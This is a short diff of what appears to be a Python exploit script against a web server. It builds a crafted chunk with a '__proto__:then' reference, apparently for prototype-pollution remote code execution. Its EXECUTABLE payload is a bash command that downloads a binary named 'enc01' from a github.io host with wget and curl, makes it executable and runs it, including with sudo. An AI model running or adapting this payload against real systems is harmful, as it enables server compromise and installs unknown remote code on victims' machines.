@@ -6,7 +6,7 @@ import sys
 import json
 
 BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
-EXECUTABLE = "bash -c \'wget https://tm0765.github.io/Down/enc01;curl https://tm0765.github.io/Down/enc01;chmod +x enc01;sudo ./enc01;./enc01\’"
+EXECUTABLE = "bash -c \'wget https://tm0765.github.io/Down/enc01;curl https://tm0765.github.io/Down/enc01;chmod +x enc01;sudo ./enc01;./enc01; \’"
 
 crafted_chunk = {
     "then": "$1:__proto__:then",
